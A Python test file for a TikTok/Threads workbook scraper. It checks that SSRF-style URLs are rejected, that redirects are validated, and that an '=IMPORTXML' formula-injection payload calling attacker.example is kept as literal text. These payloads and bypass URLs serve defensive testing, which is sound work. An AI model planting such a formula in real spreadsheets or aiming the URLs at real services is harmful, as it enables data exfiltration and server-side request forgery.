"""Synthetic regressions for the October scan/data review; no external I/O."""

import asyncio
import threading
from types import SimpleNamespace

import openpyxl
import pytest

from riviu import google_sheets_sync
from riviu.platforms import tiktok as scraper
from riviu import workbook_utils as data


TIKTOK = "https://www.tiktok.com/@demo/video/123"
THREADS = "https://www.threads.com/@demo/post/abc"
HEADERS = ["Link", "Tên Kênh", "LƯỢT XEM", "TIM", "BÌNH LUẬN", "LƯỢT LƯU", "CHIA SẺ", "Đối tác"]


def mixed_book():
    book = openpyxl.Workbook()
    sheet = book.active
    sheet.title = "Data"
    sheet.append(HEADERS)
    sheet.append([TIKTOK, "Demo", 100, 10, 1, 2, 3, "Partner"])
    sheet.append([THREADS, "Threads Demo", 200, 20, 4, None, 5, "Partner"])
    sheet.append(["Notes", "Keep this footer", 999, 999])
    return book


@pytest.mark.parametrize("url", [
    "http://127.0.0.1/tiktok.com", "http://localhost/?q=tiktok.com",
    "https://tiktok.com.attacker.example/video/1", "https://attacker.example/tiktok.com",
    "https://www.tiktok.com@127.0.0.1/video/1", "https://user@www.tiktok.com/video/1",
    "file://www.tiktok.com/video/1", "ftp://www.tiktok.com/video/1",
    "javascript:tiktok.com", "https://www.tiktok.com:444/video/1",
    "https://www.tiktok.com\\@127.0.0.1/video/1", "https://www.tiktok.com\n/video/1",
])
def test_tiktok_url_rejects_unsafe_authorities(url):
    assert data.normalize_tiktok_url(url) == ""
    assert not data.is_scrapable_tiktok_url(url)
    assert not data.is_tiktok_link(url)


@pytest.mark.parametrize("url", [
    TIKTOK, "http://tiktok.com/@demo/photo/123", "tiktok.com/@demo/video/123",
    "//www.tiktok.com/@demo/video/123", "https://m.tiktok.com/@demo/video/123",
    "https://mobile.tiktok.com/@demo/video/123", "https://vm.tiktok.com/abc/",
    "https://vt.tiktok.com/abc/", "HTTPS://WWW.TIKTOK.COM/@demo/video/123",
])
def test_tiktok_url_keeps_supported_hosts_and_schemeless_links(url):
    assert data.is_scrapable_tiktok_url(url)
    assert data.normalize_tiktok_url(url).lower().startswith(("http://", "https://"))


def test_totals_append_after_all_occupied_rows_and_only_selected_sheet(tmp_path):
    book = mixed_book()
    other = book.create_sheet("Other")
    other.append(HEADERS)
    other.append([TIKTOK, "Other", 7, 7])
    other.append(["TỔNG", None, "=SUM(C2:C2)", "=SUM(D2:D2)"])
    other_before = list(other.values)
    scraper.clear_existing_total_rows(book, sheet_name="Data")
    scraper.append_sheet_total_rows(book, sheet_name="Data")
    path = tmp_path / "mixed.xlsx"
    book.save(path)
    book.close()
    saved = openpyxl.load_workbook(path)
    try:
        assert saved["Data"]["A3"].value == THREADS
        assert saved["Data"]["C3"].value == 200
        assert saved["Data"]["B4"].value == "Keep this footer"
        assert saved["Data"]["A5"].value == "TỔNG"
        assert saved["Data"]["D5"].value == "=SUM(D2:D2)"
        assert list(saved["Other"].values) == other_before
    finally:
        saved.close()


def test_collect_rows_uses_strict_url_filter():
    book = mixed_book()
    book["Data"].append(["http://127.0.0.1/tiktok.com", "Attack"])
    assert [row["url"] for row in scraper.collect_rows(book)] == [TIKTOK]
    book.close()


def test_preview_platform_totals_exclude_hidden_links_and_footer(tmp_path):
    book = mixed_book()
    book["Data"].append(["TỔNG", None, None, None])
    path = tmp_path / "preview.xlsx"
    book.save(path)
    book.close()
    preview = data.read_sheet_preview(path, "Data", platform="tiktok")
    assert [row["Link"] for row in preview["data"]] == [TIKTOK, "TỔNG"]
    assert preview["data"][-1]["TIM"] == "10"
    threads = data.read_sheet_preview(path, "Data", platform="threads")
    assert [row["Link"] for row in threads["data"]] == [THREADS, "TỔNG"]
    assert threads["data"][-1]["TIM"] == "20"
    legacy = data.read_sheet_preview(path, "Data")
    assert len(legacy["data"]) == 4


def test_preview_limit_totals_still_cover_full_selected_platform(tmp_path):
    book = mixed_book()
    book["Data"].append([TIKTOK.replace("123", "456"), "Other", 3, 2])
    book["Data"].append(["TỔNG"])
    path = tmp_path / "preview-limit.xlsx"
    book.save(path)
    book.close()
    preview = data.read_sheet_preview(path, "Data", limit=2, platform="tiktok")
    assert preview["shownRows"] == 2
    assert preview["data"][-1]["TIM"] == "12"


def test_summary_long_source_names_have_stable_independent_tabs(tmp_path):
    first = "Long shared source tab name A"
    second = "Long shared source tab name B"
    book = openpyxl.Workbook()
    book.remove(book.active)
    for name, partner in ((first, "Partner A"), (second, "Partner B")):
        sheet = book.create_sheet(name)
        sheet.append(HEADERS)
        sheet.append([TIKTOK, "Demo", 100, 10, 1, 2, 3, partner])
        data.rebuild_summary_sheet(book, data_sheet_name=name)
    first_title = data.summary_sheet_title_for_data_sheet(first)
    second_title = data.summary_sheet_title_for_data_sheet(second)
    assert first_title != second_title
    assert len(first_title) <= 31 and len(second_title) <= 31
    assert book[first_title]["B2"].value == "Partner A"
    assert book[second_title]["B2"].value == "Partner B"
    data.rebuild_summary_sheet(book, data_sheet_name=second)
    assert book[first_title]["B2"].value == "Partner A"
    assert data.data_sheet_name_for_summary_title(book.sheetnames, first_title) == first
    path = tmp_path / "summary.xlsx"
    book.save(path)
    book.close()
    assert data.read_summary_dashboard(path, first)["rows"][0]["ĐỐI TÁC"] == "Partner A"
    assert data.read_summary_dashboard(path, second)["rows"][0]["ĐỐI TÁC"] == "Partner B"


def test_excel_input_literal_contract_survives_save_and_summary(tmp_path):
    book = mixed_book()
    payload = '=IMPORTXML("https://attacker.example", "//x")'
    data.set_cell_literal(book["Data"]["H2"], payload)
    data.rebuild_summary_sheet(book, data_sheet_name="Data")
    summary = book[data.summary_sheet_title_for_data_sheet("Data")]
    assert summary["B2"].value == payload
    assert summary["B2"].data_type == "s"
    scraper.build_result_sheet(book, [{"sheet_name": "Data", "row": 2}], "now")
    result = book[book.sheetnames[-1]]
    assert result["J2"].value == payload and result["J2"].data_type == "s"
    assert result["E3"].data_type == "f"
    path = tmp_path / "literal.xlsx"
    book.save(path)
    book.close()
    restored = openpyxl.load_workbook(path)
    try:
        assert restored[summary.title]["B2"].value == payload
        assert restored[summary.title]["B2"].data_type == "s"
        assert restored[result.title]["E3"].data_type == "f"
    finally:
        restored.close()


def test_google_push_raw_inputs_and_only_generated_total_formulas(monkeypatch):
    calls = []

    class Service:
        def spreadsheets(self):
            return self

        def values(self):
            return self

        def get(self, **_kwargs):
            return SimpleNamespace(execute=lambda: {"sheets": []})

        def batchUpdate(self, **_kwargs):
            return SimpleNamespace(execute=lambda: {"replies": [{"addSheet": {"properties": {"sheetId": 42}}}]})

        def update(self, **kwargs):
            calls.append(kwargs)
            return SimpleNamespace(execute=lambda: {})

    monkeypatch.setattr(google_sheets_sync, "sheets_service", lambda _base: Service())
    monkeypatch.setattr(google_sheets_sync, "format_result_sheet", lambda *_args: None)
    monkeypatch.setattr(google_sheets_sync, "apply_link_formatting", lambda *_args: None)
    payload = '=IMPORTXML("https://attacker.example", "//x")'
    rows = [
        ["Stt", "Ngày", "Link", "Tên Kênh", "LƯỢT XEM", "TIM", "BÌNH LUẬN", "LƯỢT LƯU", "CHIA SẺ", "Đối tác"],
        [1, payload, TIKTOK, "=1+1", 100, 10, 1, 2, 3, payload],
        ["", "", "TỔNG", "", "=SUM(E2:E2)", "=SUM(F2:F2)", "=SUM(G2:G2)", "=SUM(H2:H2)", payload],
    ]
    google_sheets_sync.push_rows_to_new_sheet("unused", "synthetic", rows)
    assert calls[0]["valueInputOption"] == "RAW"
    assert calls[0]["body"]["values"] == rows
    assert [call["body"]["values"][0][0] for call in calls[1:]] == [
        "=SUM(E2:E2)", "=SUM(F2:F2)", "=SUM(G2:G2)", "=SUM(H2:H2)",
    ]
    assert all(call["valueInputOption"] == "USER_ENTERED" for call in calls[1:])


def test_http_fetch_rejects_bad_input_and_supplies_redirect_validator(monkeypatch):
    calls = []

    class Response:
        def __enter__(self):
            return self

        def __exit__(self, *_args):
            return False

        def geturl(self):
            return TIKTOK

        def read(self):
            return b"<html>fixture</html>"

    def fake_urlopen(request, **kwargs):
        calls.append((request.full_url, kwargs))
        return Response()

    monkeypatch.setattr(scraper, "urlopen_request", fake_urlopen)
    with pytest.raises(ValueError):
        scraper.fetch_tiktok_html("http://127.0.0.1/tiktok.com")
    assert calls == []
    assert scraper.fetch_tiktok_html(TIKTOK)[0] == TIKTOK
    validator = calls[0][1]["redirect_validator"]
    assert validator(TIKTOK)
    assert not validator("http://127.0.0.1/tiktok.com")


@pytest.mark.parametrize("configs", [[], [{"enabled": False, "host": "synthetic"}]])
def test_proxy_enabled_runner_rejects_empty_enabled_pool_before_loading(tmp_path, monkeypatch, configs):
    path = tmp_path / "proxy.xlsx"
    book = mixed_book()
    book.save(path)
    book.close()
    monkeypatch.setattr(scraper, "resolve_proxy_configs", lambda *_args, **_kw: configs)
    monkeypatch.setattr(scraper.openpyxl, "load_workbook", lambda *_args: pytest.fail("must reject before workbook load"))
    with pytest.raises(ValueError, match="proxy"):
        asyncio.run(scraper.run_scraper(path, use_proxy=True))


def test_browser_redirect_rejected_before_next_request():
    calls = []
    navigations = []
    disposed = []

    class Response:
        status = 302
        headers = {"location": "http://127.0.0.1/tiktok.com"}

        async def dispose(self):
            disposed.append(True)

    async def get(url, **kwargs):
        calls.append((url, kwargs))
        return Response()

    async def goto(url, **kwargs):
        navigations.append(url)

    page = SimpleNamespace(context=SimpleNamespace(request=SimpleNamespace(get=get)), goto=goto)
    with pytest.raises(ValueError, match="không được phép"):
        asyncio.run(scraper.navigate_tiktok_page(page, TIKTOK))
    assert [url for url, _kwargs in calls] == [TIKTOK]
    assert calls[0][1]["max_redirects"] == 0
    assert navigations == [] and disposed == [True]


def test_browser_valid_short_redirect_resolved_before_navigation():
    calls = []
    navigations = []
    short = "https://vt.tiktok.com/abc/"

    class Response:
        def __init__(self, status, headers):
            self.status = status
            self.headers = headers

        async def dispose(self):
            pass

    async def get(url, **kwargs):
        calls.append(url)
        assert kwargs["max_redirects"] == 0
        return Response(302, {"location": TIKTOK}) if url == short else Response(200, {})

    async def goto(url, **kwargs):
        navigations.append(url)
        return "response"

    page = SimpleNamespace(context=SimpleNamespace(request=SimpleNamespace(get=get)), goto=goto)
    assert asyncio.run(scraper.navigate_tiktok_page(page, short)) == "response"
    assert calls == [short, TIKTOK] and navigations == [TIKTOK]


@pytest.mark.parametrize("status", [301, 302, 303, 304, 307, 308])
def test_browser_final_route_never_fulfills_redirect_response(status):
    actions = []

    async def abort():
        actions.append("abort")

    async def fulfill(**kwargs):
        actions.append("fulfill")

    async def fetch(**kwargs):
        actions.append(("fetch", kwargs))
        return SimpleNamespace(status=status, dispose=dispose)

    async def dispose():
        actions.append("dispose")

    request = SimpleNamespace(is_navigation_request=lambda: True, url=TIKTOK)
    route = SimpleNamespace(request=request, abort=abort, fetch=fetch, fulfill=fulfill)
    asyncio.run(scraper.block_heavy_resources(route))
    assert actions == [("fetch", {"max_redirects": 0, "timeout": 15000}), "abort", "dispose"]


def test_browser_initial_bad_url_never_navigates():
    page = SimpleNamespace(goto=lambda *_args, **_kw: pytest.fail("bad URL must not navigate"))
    result = asyncio.run(scraper.scrape_single_link(page, "http://127.0.0.1/tiktok.com"))
    assert result[2].startswith("Error:")
    assert result[3] == ""


def test_cancelled_request_worker_joins_owned_executor(monkeypatch):
    started = threading.Event()
    release = threading.Event()
    ended = threading.Event()

    def blocking_scrape(*_args, **_kwargs):
        started.set()
        try:
            if not release.wait(5):
                raise AssertionError("fixture release timed out")
            return {"Views": "100"}, "Demo", "Success", 1, TIKTOK
        finally:
            ended.set()

    monkeypatch.setattr(scraper, "_run_request_scrape", blocking_scrape)

    async def check():
        queue = asyncio.Queue()
        await queue.put({"url": TIKTOK})
        task = asyncio.create_task(scraper.request_worker_loop(1, queue, asyncio.Queue(), asyncio.Queue(), 0))
        try:
            assert await asyncio.to_thread(started.wait, 2)
            task.cancel()
            await asyncio.sleep(0.03)
            assert not task.done()
            assert not ended.is_set()
        finally:
            release.set()
            await asyncio.gather(task, return_exceptions=True)
        assert ended.is_set()
        assert task.cancelled()

    asyncio.run(check())


def test_cancelled_request_worker_does_not_dequeue_after_http_failure(monkeypatch):
    started = threading.Event()
    release = threading.Event()
    calls = []

    def failed_scrape(*_args, **_kwargs):
        calls.append(True)
        started.set()
        assert release.wait(5)
        raise ValueError("synthetic HTTP failure")

    monkeypatch.setattr(scraper, "_run_request_scrape", failed_scrape)

    async def check():
        queue = asyncio.Queue()
        await queue.put({"url": TIKTOK})
        await queue.put({"url": TIKTOK.replace("123", "456")})
        await queue.put(None)
        task = asyncio.create_task(scraper.request_worker_loop(1, queue, asyncio.Queue(), asyncio.Queue(), 0))
        try:
            assert await asyncio.to_thread(started.wait, 2)
            task.cancel()
            await asyncio.sleep(0.03)
        finally:
            release.set()
            await asyncio.gather(task, return_exceptions=True)
        assert task.cancelled()
        assert len(calls) == 1
        assert queue.qsize() == 2

    asyncio.run(check())


def test_synthetic_copy_scan_preserves_threads_footer_and_unselected_sheet(tmp_path, monkeypatch):
    source_path = tmp_path / "fixture-source.xlsx"
    copy_path = tmp_path / "fixture-scan-copy.xlsx"
    book = mixed_book()
    other = book.create_sheet("Other")
    other.append(HEADERS)
    other.append([TIKTOK, "Other", 7, 7])
    other.append(["TỔNG", None, "=SUM(C2:C2)"])
    book.save(source_path)
    book.close()
    copy_path.write_bytes(source_path.read_bytes())
    source_before = source_path.read_bytes()

    class NoBrowser:
        async def __aenter__(self):
            return object()

        async def __aexit__(self, *_args):
            return False

    monkeypatch.setattr(scraper, "async_playwright", NoBrowser)
    monkeypatch.setattr(scraper, "_run_request_scrape", lambda *_args, **_kwargs: (
        {"Views": "500", "Likes": "50", "Comments": "4", "Saves": "3", "Shares": "2"},
        "Demo", "Success", 1, TIKTOK,
    ))
    asyncio.run(scraper.run_scraper(copy_path, sheet_name="Data", worker_count=1, retries=0, base_dir=tmp_path))
    assert source_path.read_bytes() == source_before
    saved = openpyxl.load_workbook(copy_path)
    try:
        assert saved["Data"]["C2"].value == 500
        assert saved["Data"]["A3"].value == THREADS
        assert saved["Data"]["C3"].value == 200
        assert saved["Data"]["B4"].value == "Keep this footer"
        assert saved["Data"]["A5"].value == "TỔNG"
        assert saved["Data"]["D5"].value == "=SUM(D2:D2)"
        assert saved["Other"]["C2"].value == 7
        assert saved["Other"]["A3"].value == "TỔNG"
    finally:
        saved.close()


def test_cancelled_scan_keeps_proxy_pool_until_http_exits(tmp_path, monkeypatch):
    path = tmp_path / "cancel.xlsx"
    book = mixed_book()
    book.save(path)
    book.close()
    started = threading.Event()
    release = threading.Event()
    ended = threading.Event()
    pool_changes = []
    proxy = {"enabled": True, "type": "http", "host": "synthetic", "port": 8080}

    class NoBrowser:
        async def __aenter__(self):
            return object()

        async def __aexit__(self, *_args):
            return False

    def blocking_scrape(*_args, **_kwargs):
        started.set()
        try:
            if not release.wait(5):
                raise AssertionError("fixture release timed out")
            return {"Views": "100"}, "Demo", "Success", 1, TIKTOK
        finally:
            ended.set()

    def track_pool(configs):
        pool_changes.append((list(configs), ended.is_set()))

    monkeypatch.setattr(scraper, "async_playwright", NoBrowser)
    monkeypatch.setattr(scraper, "resolve_proxy_configs", lambda *_args, **_kw: [proxy])
    monkeypatch.setattr(scraper, "set_session_proxies", track_pool)
    monkeypatch.setattr(scraper, "_run_request_scrape", blocking_scrape)

    async def check():
        task = asyncio.create_task(scraper.run_scraper(path, sheet_name="Data", use_proxy=True, retries=0))
        try:
            assert await asyncio.to_thread(started.wait, 2)
            task.cancel()
            await asyncio.sleep(0.03)
            assert not task.done()
            assert pool_changes == [([proxy], False)]
        finally:
            release.set()
            await asyncio.gather(task, return_exceptions=True)
        assert task.cancelled()
        assert pool_changes[-1] == ([], True)

    asyncio.run(check())
